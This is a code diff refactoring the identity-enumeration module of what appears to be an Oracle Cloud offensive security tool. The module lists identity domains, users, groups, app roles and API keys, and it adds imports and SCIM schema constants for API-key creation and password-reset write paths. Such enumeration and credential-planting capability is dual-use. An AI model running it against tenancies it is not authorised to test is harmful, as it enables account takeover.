@@ -1,15 +1,26 @@
 import argparse
 import json
 import hashlib
+import os
 from collections import deque
 from dataclasses import dataclass
 from datetime import datetime, timezone
-from typing import Any, Optional
+from typing import Any, Dict, List, Optional, Tuple
 
 import oci
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
 from ocinferno.core.console import UtilityTools
 from ocinferno.core.utils.module_helpers import domain_matches, parse_csv_args
-from ocinferno.core.utils.service_runtime import _init_client
+from ocinferno.core.utils.selection_helpers import (
+    _s,
+    choose_identity_domain,
+    extract_active_cred_user_ocid,
+    paged_search_select,
+    select_from_db_or_manual,
+)
+from ocinferno.core.utils.service_runtime import ResourceBase, _init_client
 
 
 # =============================================================================
@@ -53,52 +64,16 @@ TABLE_IDD_USER_AUTH_TOKENS = "identity_domain_user_auth_tokens"
 TABLE_POLICIES = "identity_policies"
 TABLE_POLICY_PARSED = "identity_policy_statements"
 
+# SCIM schema URNs used by the User/Group write paths below.
+IDD_API_KEY_SCHEMA = "urn:ietf:params:scim:schemas:oracle:idcs:apikey"
+IDD_USER_SCHEMA = "urn:ietf:params:scim:schemas:core:2.0:User"
+PATCHOP_SCHEMA = "urn:ietf:params:scim:api:messages:2.0:PatchOp"
+PW_RESETTER_SCHEMA = "urn:ietf:params:scim:schemas:oracle:idcs:UserPasswordResetter"
+
 # =============================================================================
 # Common dataclasses
 # =============================================================================
 
-@dataclass(frozen=True)
-class PrincipalEnumResult:
-    compartment_users: list[dict[str, Any]]
-    compartment_groups: list[dict[str, Any]]
-    compartment_memberships: list[dict[str, Any]]
-    compartment_dynamic_groups: list[dict[str, Any]]
-
-    domain_users: list[dict[str, Any]]
-    domain_groups: list[dict[str, Any]]
-    domain_memberships: list[dict[str, Any]]
-    domain_dynamic_groups: list[dict[str, Any]]
-
-    domains: list[dict[str, Any]]
-
-
-@dataclass(frozen=True)
-class IdentityDomainCredsEnumResult:
-    domains: list[dict[str, Any]]
-    smtp_credentials: list[dict[str, Any]]
-    db_credentials: list[dict[str, Any]]
-    api_keys: list[dict[str, Any]]
-
-
-@dataclass(frozen=True)
-class IamEnumResult:
-    policies: list[dict[str, Any]]
-    parsed: list[dict[str, Any]]
-
-
-@dataclass(frozen=True)
-class IdentityDomainEnumResult:
-    domains: list[dict[str, Any]]
-
-
-@dataclass(frozen=True)
-class IdentityDomainSettingsEnumResult:
-    domains: list[dict[str, Any]]
-    password_policies: list[dict[str, Any]]
-    lockout_policies: list[dict[str, Any]]
-    identity_providers: list[dict[str, Any]]
-    sign_on_policies: list[dict[str, Any]]
-    mfa_settings: list[dict[str, Any]]
 
 
 # =============================================================================
@@ -843,7 +818,7 @@ class IdentityResourceClient:
 
         return out
 
-class IdentityResourceSuite:
+class IdentityResourceSuite(ResourceBase):
     """
     Consolidated Identity wrapper methods used by Enumeration/enum_identity.py.
     All Identity component orchestration lives here (no enum_* utility modules).
@@ -865,12 +840,6 @@ class IdentityResourceSuite:
     def _parse_known(parser: argparse.ArgumentParser, user_args) -> argparse.Namespace:
         args, _unknown = parser.parse_known_args(list(user_args))
         return args
-
-    @staticmethod
-    def _s(value: Any) -> str:
-        if value is None:
-            return ""
-        return value.strip() if isinstance(value, str) else str(value)
 
     @staticmethod
     def _print_section(title: str, rows: list[dict[str, Any]], columns: list[str]) -> None:
@@ -929,17 +898,17 @@ class IdentityResourceSuite:
         for dom in domains or []:
             if not isinstance(dom, dict):
                 continue
-            dom_id = self._s(dom.get("id"))
+            dom_id = _s(dom.get("id"))
             if not dom_id:
                 continue
-            domain_label_by_id[dom_id] = self._s(dom.get("display_name") or dom.get("name") or dom_id)
+            domain_label_by_id[dom_id] = _s(dom.get("display_name") or dom.get("name") or dom_id)
             ordered_domain_ids.append(dom_id)
 
         grouped: dict[str, list[dict[str, Any]]] = {}
         for row in rows:
             if not isinstance(row, dict):
                 continue
-            dom_id = self._s(row.get("domain_ocid"))
+            dom_id = _s(row.get("domain_ocid"))
             grouped.setdefault(dom_id, []).append(row)
 
         seen: set[str] = set()
@@ -948,14 +917,14 @@ class IdentityResourceSuite:
             if not dom_rows:
                 continue
             seen.add(dom_id)
-            dom_name = domain_label_by_id.get(dom_id) or self._s(dom_rows[0].get("identity_domain_name")) or dom_id
+            dom_name = domain_label_by_id.get(dom_id) or _s(dom_rows[0].get("identity_domain_name")) or dom_id
             print(f"\n[*] Identity Domain: {dom_name} ({dom_id})")
             UtilityTools.print_limited_table(dom_rows, columns, sort_key=None)
 
         for dom_id, dom_rows in grouped.items():
             if dom_id in seen:
                 continue
-            dom_name = self._s(dom_rows[0].get("identity_domain_name")) or dom_id or "<unknown>"
+            dom_name = _s(dom_rows[0].get("identity_domain_name")) or dom_id or "<unknown>"
             suffix = f" ({dom_id})" if dom_id else ""
             print(f"\n[*] Identity Domain: {dom_name}{suffix}")
             UtilityTools.print_limited_table(dom_rows, columns, sort_key=None)
@@ -977,7 +946,7 @@ class IdentityResourceSuite:
             source = "current_run"
             domains = list(self._runtime_domains or [])
             if compartment_id:
-                domains = [d for d in domains if self._s(d.get("compartment_id")) == compartment_id]
+                domains = [d for d in domains if _s(d.get("compartment_id")) == compartment_id]
         else:
             domains = self._load_identity_domains_from_db(self.session, compartment_id=compartment_id or None)
             if self._domains_refresh_failed and not self._domains_refresh_warned:
@@ -995,11 +964,11 @@ class IdentityResourceSuite:
     def _active_user_ocid(self) -> str:
         creds = getattr(self.session, "credentials", None)
         if isinstance(creds, dict):
-            direct = self._s(creds.get("user") or creds.get("user_ocid"))
+            direct = _s(creds.get("user") or creds.get("user_ocid"))
             if direct:
                 return direct
             cfg = creds.get("config") if isinstance(creds.get("config"), dict) else {}
-            return self._s(cfg.get("user"))
+            return _s(cfg.get("user"))
         return ""
 
     def _persist_active_cred_identity_domain(self, idd_users: list[dict[str, Any]]) -> None:
@@ -1014,22 +983,22 @@ class IdentityResourceSuite:
             row = next(
                 (
                     r for r in (idd_users or [])
-                    if isinstance(r, dict) and self._s(r.get("ocid")) == user_ocid
+                    if isinstance(r, dict) and _s(r.get("ocid")) == user_ocid
                 ),
                 None,
             )
             if not isinstance(row, dict):
                 return
 
-            credname = self._s(getattr(self.session, "credname", ""))
+            credname = _s(getattr(self.session, "credname", ""))
             if not credname:
                 return
 
             self.session.update_cred_session_metadata(
                 credname,
                 {
-                    "identity_domain_ocid": self._s(row.get("domain_ocid")),
-                    "identity_domain_name": self._s(row.get("identity_domain_name")),
+                    "identity_domain_ocid": _s(row.get("domain_ocid")),
+                    "identity_domain_name": _s(row.get("identity_domain_name")),
                 },
             )
         except Exception:
@@ -1038,36 +1007,36 @@ class IdentityResourceSuite:
     @staticmethod
     def _extract_link(obj: Any) -> dict[str, str]:
         if not isinstance(obj, dict):
-            text = IdentityResourceSuite._s(obj)
+            text = _s(obj)
             return {"id": text, "name": text, "ref": "", "type": ""}
         return {
-            "id": IdentityResourceSuite._s(obj.get("value") or obj.get("id") or obj.get("ocid")),
-            "name": IdentityResourceSuite._s(obj.get("display") or obj.get("display_name") or obj.get("name")),
-            "ref": IdentityResourceSuite._s(obj.get("ref") or obj.get("$ref")),
-            "type": IdentityResourceSuite._s(obj.get("type")),
+            "id": _s(obj.get("value") or obj.get("id") or obj.get("ocid")),
+            "name": _s(obj.get("display") or obj.get("display_name") or obj.get("name")),
+            "ref": _s(obj.get("ref") or obj.get("$ref")),
+            "type": _s(obj.get("type")),
         }
 
     @staticmethod
     def _extract_entitlement(obj: Any) -> dict[str, str]:
         if not isinstance(obj, dict):
-            text = IdentityResourceSuite._s(obj)
+            text = _s(obj)
             return {"id": text, "name": text, "ref": "", "attribute_name": "", "attribute_value": ""}
-        attr_name = IdentityResourceSuite._s(obj.get("attribute_name") or obj.get("attributeName"))
-        attr_value = IdentityResourceSuite._s(obj.get("attribute_value") or obj.get("attributeValue"))
-        ent_id = IdentityResourceSuite._s(obj.get("value") or obj.get("id") or attr_value)
-        ent_name = IdentityResourceSuite._s(obj.get("display") or obj.get("display_name") or obj.get("name") or ent_id)
+        attr_name = _s(obj.get("attribute_name") or obj.get("attributeName"))
+        attr_value = _s(obj.get("attribute_value") or obj.get("attributeValue"))
+        ent_id = _s(obj.get("value") or obj.get("id") or attr_value)
+        ent_name = _s(obj.get("display") or obj.get("display_name") or obj.get("name") or ent_id)
         return {
             "id": ent_id,
             "name": ent_name,
-            "ref": IdentityResourceSuite._s(obj.get("ref") or obj.get("$ref")),
+            "ref": _s(obj.get("ref") or obj.get("$ref")),
             "attribute_name": attr_name,
             "attribute_value": attr_value,
         }
 
     @staticmethod
     def _summary_name_id(name: str, ident: str) -> str:
-        n = IdentityResourceSuite._s(name)
-        i = IdentityResourceSuite._s(ident)
+        n = _s(name)
+        i = _s(ident)
         if n and i and n != i:
             return f"{n} ({i})"
         return n or i
@@ -1092,22 +1061,22 @@ class IdentityResourceSuite:
         for user in users or []:
             if not isinstance(user, dict):
                 continue
-            user_ocid = self._s(user.get("ocid"))
+            user_ocid = _s(user.get("ocid"))
             if not user_ocid:
                 continue
-            user_scim_id = self._s(user.get("id"))
-            user_name = self._s(user.get("user_name") or user.get("userName"))
+            user_scim_id = _s(user.get("id"))
+            user_name = _s(user.get("user_name") or user.get("userName"))
 
             for gref in self._as_list(user.get("groups")):
                 if not isinstance(gref, dict):
                     continue
-                group_ocid = self._s(gref.get("ocid"))
+                group_ocid = _s(gref.get("ocid"))
                 if not group_ocid:
                     continue
-                membership_ocid = self._s(gref.get("membership_ocid") or gref.get("membershipOcid") or gref.get("id"))
+                membership_ocid = _s(gref.get("membership_ocid") or gref.get("membershipOcid") or gref.get("id"))
                 row_id = membership_ocid or f"{user_ocid}::{group_ocid}"
-                group_scim_id = self._s(gref.get("value") or gref.get("id"))
-                group_name = self._s(
+                group_scim_id = _s(gref.get("value") or gref.get("id"))
+                group_name = _s(
                     gref.get("display")
                     or gref.get("display_name")
                     or gref.get("name")
@@ -1126,13 +1095,13 @@ class IdentityResourceSuite:
                         "group_scim_id": group_scim_id,
                         "user_name": user_name,
                         "group_name": group_name,
-                        "domain_ocid": self._s(user.get("domain_ocid")),
-                        "identity_domain_name": self._s(user.get("identity_domain_name")),
-                        "identity_domain_url": self._s(user.get("identity_domain_url")),
-                        "compartment_ocid": self._s(user.get("compartment_ocid")),
-                        "compartment_id": self._s(user.get("compartment_id") or user.get("compartment_ocid")),
-                        "tenancy_ocid": self._s(user.get("tenancy_ocid")),
-                        "inactive_status": self._s(gref.get("inactive_status")),
+                        "domain_ocid": _s(user.get("domain_ocid")),
+                        "identity_domain_name": _s(user.get("identity_domain_name")),
+                        "identity_domain_url": _s(user.get("identity_domain_url")),
+                        "compartment_ocid": _s(user.get("compartment_ocid")),
+                        "compartment_id": _s(user.get("compartment_id") or user.get("compartment_ocid")),
+                        "tenancy_ocid": _s(user.get("tenancy_ocid")),
+                        "inactive_status": _s(gref.get("inactive_status")),
                         "source": "idd_user_groups",
                     }
                 )
@@ -1152,13 +1121,13 @@ class IdentityResourceSuite:
                     continue
                 label = ""
                 for key in name_keys:
-                    label = self._s(row.get(key))
+                    label = _s(row.get(key))
                     if label:
                         break
                 if not label:
                     continue
-                rid = self._s(row.get("id"))
-                rocid = self._s(row.get("ocid"))
+                rid = _s(row.get("id"))
+                rocid = _s(row.get("ocid"))
                 if rid:
                     lookup[rid] = label
                 if rocid:
@@ -1168,8 +1137,8 @@ class IdentityResourceSuite:
     def _normalize_grant_row(self, grant: dict[str, Any], *, principal_lookup: dict[str, str]) -> dict[str, Any]:
         row = dict(grant or {})
 
-        grant_mechanism = self._s(row.get("grant_mechanism") or row.get("grantMechanism"))
-        app_entitlement_id = self._s(row.get("app_entitlement_id") or row.get("appEntitlementId"))
+        grant_mechanism = _s(row.get("grant_mechanism") or row.get("grantMechanism"))
+        app_entitlement_id = _s(row.get("app_entitlement_id") or row.get("appEntitlementId"))
 
         grantee_obj = row.get("grantee")
         grantor_obj = row.get("grantor")
@@ -1228,7 +1197,7 @@ class IdentityResourceSuite:
         role_summary = self._summary_name_id(row["app_role_name"], row["app_role_id"])
         ent_summary = self._summary_name_id(row["entitlement_name"], row["entitlement_id"])
         if not ent_summary:
-            ent_summary = self._s(row.get("app_entitlement_id"))
+            ent_summary = _s(row.get("app_entitlement_id"))
         if role_summary:
             row["granted_summary"] = f"{app_summary} | role={role_summary} | ent={ent_summary or '<none>'}"
         else:
@@ -1240,10 +1209,10 @@ class IdentityResourceSuite:
         row["app_role_raw_json"] = IdentityHelperUtils.json_blob(app_role_obj)
         row["entitlement_raw_json"] = IdentityHelperUtils.json_blob(entitlement_obj)
 
-        if not self._s(row.get("composite_key")):
+        if not _s(row.get("composite_key")):
             row["composite_key"] = "|".join(
                 [
-                    self._s(row.get("domain_ocid")),
+                    _s(row.get("domain_ocid")),
                     row["grantee_id"],
                     row["app_id"],
                     row["app_role_id"],
@@ -1279,33 +1248,33 @@ class IdentityResourceSuite:
     ) -> dict[str, Any]:
         out = dict(token_row or {})
         user_obj = out.get("user") if isinstance(out.get("user"), dict) else {}
-        user_ocid = self._s(user_obj.get("ocid") or user_row.get("ocid") or out.get("user_ocid"))
-        username = self._s(
+        user_ocid = _s(user_obj.get("ocid") or user_row.get("ocid") or out.get("user_ocid"))
+        username = _s(
             out.get("username")
             or user_obj.get("display")
             or user_row.get("user_name")
             or user_row.get("display_name")
         )
-        token_name = self._s(out.get("token_name") or out.get("description") or out.get("name")) or "auth-token"
-        token_hint = self._s(out.get("token"))
+        token_name = _s(out.get("token_name") or out.get("description") or out.get("name")) or "auth-token"
+        token_hint = _s(out.get("token"))
 
-        out["token_id"] = self._token_id(user_ocid, token_name, token_hint, self._s(out.get("id")))
+        out["token_id"] = self._token_id(user_ocid, token_name, token_hint, _s(out.get("id")))
         out["token_name"] = token_name
         out["username"] = username
         out["token_preview"] = self._token_preview(token_hint)
-        out["token_value"] = self._s(out.get("token_value"))
-        out["source"] = self._s(out.get("source")) or source
-        out["region"] = self._s(out.get("region") or getattr(self.session, "region", ""))
-        out["tenancy_namespace"] = self._s(out.get("tenancy_namespace"))
-        out["domain_ocid"] = self._s(out.get("domain_ocid") or dom.get("id"))
+        out["token_value"] = _s(out.get("token_value"))
+        out["source"] = _s(out.get("source")) or source
+        out["region"] = _s(out.get("region") or getattr(self.session, "region", ""))
+        out["tenancy_namespace"] = _s(out.get("tenancy_namespace"))
+        out["domain_ocid"] = _s(out.get("domain_ocid") or dom.get("id"))
         out["user_ocid"] = user_ocid
-        out["compartment_id"] = self._s(
+        out["compartment_id"] = _s(
             out.get("compartment_id")
             or dom.get("compartment_id")
             or dom.get("compartmentId")
             or getattr(self.session, "compartment_id", "")
         )
-        if not self._s(out.get("created_at_utc")):
+        if not _s(out.get("created_at_utc")):
             out["created_at_utc"] = datetime.utcnow().isoformat(timespec="seconds") + "Z"
         out["updated_at_utc"] = datetime.utcnow().isoformat(timespec="seconds") + "Z"
         return out
@@ -1313,15 +1282,14 @@ class IdentityResourceSuite:
     # -------------------------------------------------------------------------
     # Domains
     # -------------------------------------------------------------------------
-    def _run_domains(self, user_args):
+    def enumerate_domains(self, user_args):
         parser = argparse.ArgumentParser(
             description="Enumerate Identity Domains from current compartment (IdentityClient.list_domains).",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save domains to local DB")
         parser.add_argument("--domain", required=False, help="Filter by substring in id/display_name/url")
         args = self._parse_known(parser, user_args)
-        save = bool(args.save)
+        save = True
         self._domains_refresh_failed = False
         self._domains_refresh_error = ""
         self._domains_refresh_warned = False
@@ -1335,12 +1303,13 @@ class IdentityResourceSuite:
         try:
             domains = ops.list_identity_domains(compartment_id=compartment_id) or []
         except Exception as e:
-            err = f"{type(e).__name__}: {e}"
+            from ocinferno.core.utils.service_runtime import component_error_summary
+            err = component_error_summary(e)
             self._domains_refresh_failed = True
             self._domains_refresh_error = err
             print(
-                f"{UtilityTools.RED}[X] enum_domains live call failed: {err}{UtilityTools.RESET}\n"
-                f"{UtilityTools.YELLOW}[*] Continuing with DB cache for downstream IDD components.{UtilityTools.RESET}"
+                f"{UtilityTools.YELLOW}[!] enum_domains: live list failed ({err}); "
+                f"continuing with DB cache for downstream IDD components.{UtilityTools.RESET}"
             )
             UtilityTools.dlog(self.debug, "enum_domains: list_identity_domains failed", err=err)
             return {"ok": False, "domains": 0}
@@ -1359,7 +1328,7 @@ class IdentityResourceSuite:
             if not isinstance(d, dict):
                 continue
             row = dict(d)
-            row["compartment_id"] = self._s(
+            row["compartment_id"] = _s(
                 row.get("compartment_id") or row.get("compartmentId") or compartment_id
             )
             normalized_domains.append(row)
@@ -1393,12 +1362,11 @@ class IdentityResourceSuite:
         )
         parser.add_argument("--proxy", required=False, help="Proxy address (e.g., http://127.0.0.1:8080)")
         parser.add_argument("-v", "--debug", action="store_true", help="Verbose debug output")
-        parser.add_argument("--save", action="store_true", help="Save results into DB (service tables)")
         parser.add_argument("--iam-policies", action="store_true", help="Enumerate classic IAM policies")
         args = self._parse_known(parser, user_args)
 
         debug = bool(self.debug or getattr(args, "debug", False))
-        save = bool(getattr(args, "save", False))
+        save = True
 
         if getattr(args, "proxy", None):
             try:
@@ -1430,7 +1398,7 @@ class IdentityResourceSuite:
     # -------------------------------------------------------------------------
     # Principals
     # -------------------------------------------------------------------------
-    def _run_principals(self, user_args):
+    def enumerate_principals(self, user_args):
         parser = argparse.ArgumentParser(
             description=(
                 "Enumerate OCI principals.\n"
@@ -1439,7 +1407,6 @@ class IdentityResourceSuite:
             ),
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save results into DB (service tables).")
         lane = parser.add_mutually_exclusive_group()
         lane.add_argument("--idd", "--idd-only", dest="idd_only", action="store_true", help="Enumerate Identity Domain principals only.")
         lane.add_argument("--classic", "--classic-only", dest="classic_only", action="store_true", help="Enumerate classic principals only.")
@@ -1457,7 +1424,7 @@ class IdentityResourceSuite:
         parser.add_argument("--memberships", action="store_true", help="Enumerate user-group memberships.")
         args = self._parse_known(parser, user_args)
 
-        save = bool(args.save)
+        save = True
         compartment_id = getattr(self.session, "compartment_id", None)
         if not isinstance(compartment_id, str) or not compartment_id:
             print(f"{UtilityTools.RED}[X] session.compartment_id is not set; cannot enumerate principals.{UtilityTools.RESET}")
@@ -1485,7 +1452,7 @@ class IdentityResourceSuite:
                 all_saved_domains=False,
                 domain_filter=args.domain_filter or "",
             )
-            domain_endpoints = [self._s(d.get("url")) for d in domains if self._s(d.get("url"))]
+            domain_endpoints = [_s(d.get("url")) for d in domains if _s(d.get("url"))]
             if domains:
                 source_label = "current run" if domain_source == "current_run" else "DB cache"
                 self._print_section(f"Identity Domains ({source_label})", domains, ["id", "display_name", "url", "home_region"])
@@ -1501,24 +1468,19 @@ class IdentityResourceSuite:
         if do_idd:
             for domain_url in domain_endpoints:
                 idd_ops = IdentityDomainResourceClient(session=self.session, service_endpoint=domain_url)
-                dom_match = next((d for d in domains if self._s(d.get("url")) == self._s(domain_url)), {})
-                dom_id = self._s(dom_match.get("id"))
-                dom_name = self._s(dom_match.get("display_name") or dom_match.get("name"))
-                dom_compartment_id = self._s(
+                dom_match = next((d for d in domains if _s(d.get("url")) == _s(domain_url)), {})
+                dom_id = _s(dom_match.get("id"))
+                dom_name = _s(dom_match.get("display_name") or dom_match.get("name"))
+                dom_compartment_id = _s(
                     dom_match.get("compartment_id") or dom_match.get("compartmentId") or compartment_id
                 )
 
                 if want_users or want_memberships:
                     try:
-                        rows = [IdentityHelperUtils.normalize_idd_user(u) for u in (idd_ops.list_identity_domain_users() or []) if isinstance(u, dict)]
-                        for r in rows:
-                            idd_ops.apply_domain_context(
-                                r,
-                                domain_id=dom_id,
-                                domain_name=dom_name,
-                                domain_url=domain_url,
-                                compartment_id=dom_compartment_id,
-                            )
+                        rows = User._fetch_idd_from_domain(
+                            self.session, idd_ops, dom_id=dom_id, dom_name=dom_name,
+                            domain_url=domain_url, compartment_id=dom_compartment_id,
+                        )
                         if want_users:
                             idd_users.extend(rows)
                             if save and rows:
@@ -1542,15 +1504,10 @@ class IdentityResourceSuite:
 
                 if want_groups:
                     try:
-                        rows = [IdentityHelperUtils.normalize_idd_group(g) for g in (idd_ops.list_identity_domain_groups() or []) if isinstance(g, dict)]
-                        for r in rows:
-                            idd_ops.apply_domain_context(
-                                r,
-                                domain_id=dom_id,
-                                domain_name=dom_name,
-                                domain_url=domain_url,
-                                compartment_id=dom_compartment_id,
-                            )
+                        rows = Group._fetch_idd_from_domain(
+                            self.session, idd_ops, dom_id=dom_id, dom_name=dom_name,
+                            domain_url=domain_url, compartment_id=dom_compartment_id,
+                        )
                         idd_groups.extend(rows)
                         if save and rows:
                             idd_ops.save_idd_groups(rows)
@@ -1575,8 +1532,8 @@ class IdentityResourceSuite:
                         UtilityTools.dlog(self.debug, "enum_principals: IDD dynamic groups failed", domain_url=domain_url, err=f"{type(e).__name__}: {e}")
 
         for r in (idd_users + idd_groups + idd_dynamic_groups):
-            rid = self._s(r.get("id"))
-            rocid = self._s(r.get("ocid"))
+            rid = _s(r.get("id"))
+            rocid = _s(r.get("ocid"))
             if rid:
                 idd_seen.add(rid)
             if rocid:
@@ -1625,12 +1582,12 @@ class IdentityResourceSuite:
         if do_classic:
             if want_users:
                 try:
-                    classic_users = classic_ops.list_users(compartment_id=compartment_id) or []
+                    classic_users = User._fetch_classic(self.session, classic_ops, compartment_id=compartment_id)
                 except Exception as e:
                     UtilityTools.dlog(self.debug, "enum_principals: classic users failed", err=f"{type(e).__name__}: {e}")
             if want_groups:
                 try:
-                    classic_groups = classic_ops.list_groups(compartment_id=compartment_id) or []
+                    classic_groups = Group._fetch_classic(self.session, classic_ops, compartment_id=compartment_id)
                 except Exception as e:
                     UtilityTools.dlog(self.debug, "enum_principals: classic groups failed", err=f"{type(e).__name__}: {e}")
             if want_dgs:
@@ -1644,7 +1601,7 @@ class IdentityResourceSuite:
                     if not users_for_memberships:
                         users_for_memberships = classic_ops.list_users(compartment_id=compartment_id) or []
                     for user in users_for_memberships:
-                        user_id = self._s(user.get("id"))
+                        user_id = _s(user.get("id"))
                         if not user_id:
                             continue
                         rows = classic_ops.list_memberships(compartment_id=compartment_id, user_id=user_id) or []
@@ -1652,10 +1609,10 @@ class IdentityResourceSuite:
                             if not isinstance(row, dict):
                                 continue
                             norm = dict(row)
-                            norm["membership_id"] = self._s(norm.get("membership_id") or norm.get("id"))
+                            norm["membership_id"] = _s(norm.get("membership_id") or norm.get("id"))
                             norm.pop("membership_ocid", None)
-                            norm.setdefault("user_name", self._s(user.get("name")))
-                            norm.setdefault("tenancy_ocid", self._s(getattr(self.session, "tenant_id", None)))
+                            norm.setdefault("user_name", _s(user.get("name")))
+                            norm.setdefault("tenancy_ocid", _s(getattr(self.session, "tenant_id", None)))
                             classic_memberships.append(norm)
                 except Exception as e:
                     UtilityTools.dlog(self.debug, "enum_principals: classic memberships failed", err=f"{type(e).__name__}: {e}")
@@ -1671,7 +1628,7 @@ class IdentityResourceSuite:
                     for row in rows or []:
                         matched = False
                         for key in keys:
-                            value = self._s(row.get(key))
+                            value = _s(row.get(key))
                             if value and value in idd_seen:
                                 matched = True
                                 break
@@ -1733,7 +1690,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain Applications (SCIM Apps) for each saved Identity Domain.",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save apps to DB")
         parser.add_argument("--domain", required=False, help="Filter domains by substring (id/name/url/display_name).")
         parser.add_argument("--get", action="store_true", help="Reserved.")
         args = self._parse_known(parser, user_args)
@@ -1746,9 +1702,10 @@ class IdentityResourceSuite:
         _comp_id, domains, domain_source = self._load_domains_from_cache(all_saved_domains=False, domain_filter=args.domain or "")
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in table '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
-                "Then re-run: modules run enum_identity --idd-apps --save (optional)"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-apps (optional)"
             )
             return {"ok": False, "apps": 0}
 
@@ -1757,10 +1714,10 @@ class IdentityResourceSuite:
 
         total_apps = 0
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
                 dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
             )
             if not dom_url:
@@ -1783,7 +1740,7 @@ class IdentityResourceSuite:
                     compartment_id=dom_compartment_id,
                 )
 
-            if args.save and apps:
+            if apps:
                 try:
                     ops.save_idd_apps(apps=apps, compartment_id=dom_compartment_id)
                 except Exception as e:
@@ -1793,7 +1750,7 @@ class IdentityResourceSuite:
             UtilityTools.print_limited_table(apps, ["domain_ocid", "id", "display_name", "active"], sort_key="display_name")
 
         print(f"\n[*] enum_idd_apps complete. Domains: {len(domains)} | Apps: {total_apps}")
-        return {"ok": True, "apps": int(total_apps), "saved": bool(args.save)}
+        return {"ok": True, "apps": int(total_apps), "saved": True}
 
     # -------------------------------------------------------------------------
     # Identity Domain app roles
@@ -1803,7 +1760,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain App Roles (SCIM) using Identity Domains cached in DB.",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save app roles to DB.")
         parser.add_argument("--domain", required=False, help="Filter domains by id/name/url substring.")
         parser.add_argument("--attributes", required=False, help="Override SCIM attributes list for list_app_roles().")
         parser.add_argument("--limit", type=int, default=200, help="Max rows to print per domain.")
@@ -1824,14 +1780,15 @@ class IdentityResourceSuite:
         )
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
                 "Then rerun this module."
             )
             return {"ok": False, "app_roles": 0}
 
         if not scope_all:
-            domains = [d for d in domains if self._s(d.get("compartment_id")) == compartment_id]
+            domains = [d for d in domains if _s(d.get("compartment_id")) == compartment_id]
         if not domains:
             print("[*] No identity domains matched scope/filter.")
             return {"ok": True, "app_roles": 0}
@@ -1844,10 +1801,10 @@ class IdentityResourceSuite:
         domains_touched = 0
 
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
                 dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
             )
             if not dom_url:
@@ -1888,14 +1845,14 @@ class IdentityResourceSuite:
                 truncate=140,
             )
 
-            if args.save and app_roles:
+            if app_roles:
                 try:
                     ops.save_idd_app_roles(app_roles=app_roles, compartment_id=dom_compartment_id)
                 except Exception as e:
                     UtilityTools.dlog(self.debug, "enum_idd_app_roles: save_idd_app_roles failed", domain_id=dom_id, err=f"{type(e).__name__}: {e}")
 
         print(f"\n[*] enum_idd_app_roles complete. Domains: {domains_touched} | AppRoles: {total_roles}")
-        return {"ok": True, "app_roles": int(total_roles), "saved": bool(args.save)}
+        return {"ok": True, "app_roles": int(total_roles), "saved": True}
 
     # -------------------------------------------------------------------------
     # Identity Domain API keys
@@ -1905,7 +1862,6 @@ class IdentityResourceSuite:
             description="Enumerate Identity Domain API Keys (SCIM ApiKeys) for saved Identity Domains.",
             allow_abbrev=False,
         )
-        parser.add_argument("--save", action="store_true", help="Save API keys to DB.")
         parser.add_argument("--domain", required=False, help="Filter domains by substring.")
         parser.add_argument("--attributes", required=False, help="Override SCIM attributes list for list_api_keys().")
         parser.add_argument("--all-saved-domains", action="store_true", help="Use all saved domains.")
@@ -1922,9 +1878,10 @@ class IdentityResourceSuite:
         )
         if not domains:
             print(
-                f"{UtilityTools.RED}[X] No saved identity domains found in table '{TABLE_IDENTITY_DOMAINS}'.{UtilityTools.RESET}\n"
-                "Run: modules run enum_identity --domains --save\n"
-                "Then re-run: modules run enum_identity --idd-api-keys --save (optional)"
+                f"{UtilityTools.YELLOW}[*] No identity domains cached; skipping "
+                f"(run 'modules run enum_identity --domains' first).{UtilityTools.RESET}\n"
+                "Run: modules run enum_identity --domains\n"
+                "Then re-run: modules run enum_identity --idd-api-keys (optional)"
             )
             return {"ok": False, "api_keys": 0}
 
@@ -1934,10 +1891,10 @@ class IdentityResourceSuite:
         attrs = args.attributes or None
         total = 0
         for dom in domains:
-            dom_id = self._s(dom.get("id"))
-            dom_name = self._s(dom.get("display_name"))
-            dom_url = self._s(dom.get("url"))
-            dom_compartment_id = self._s(
+            dom_id = _s(dom.get("id"))
+            dom_name = _s(dom.get("display_name"))
+            dom_url = _s(dom.get("url"))
+            dom_compartment_id = _s(
                 dom.get("compartment_id") or dom.get("compartmentId") or compartment_id
             )
             if not dom_url:
@@ -1966,7 +1923,7 @@ class IdentityResourceSuite:
                     )
                 keys.extend(rows)
                 total += len(rows)
-                if args.save and rows:
+                if rows:
                     try:
                         ops.save_idd_api_keys(api_keys=rows)
                     except Exception as e:
@@ -1988,7 +1945,7 @@ class IdentityResourceSuite:
             )
 
